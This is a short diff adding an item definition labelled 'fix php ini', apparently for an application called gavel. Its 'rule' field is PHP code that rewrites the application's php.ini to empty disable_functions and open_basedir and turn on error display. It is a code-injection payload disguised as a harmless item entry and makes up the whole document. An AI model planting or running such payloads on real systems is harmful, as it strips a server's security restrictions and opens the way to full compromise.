@@ -1,0 +1,6 @@
+name: fixini
+description: fix php ini
+image: "x.png"
+price: 1
+rule_msg: "fixini"
+rule: file_put_contents('/opt/gavel/.config/php/php.ini',"engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
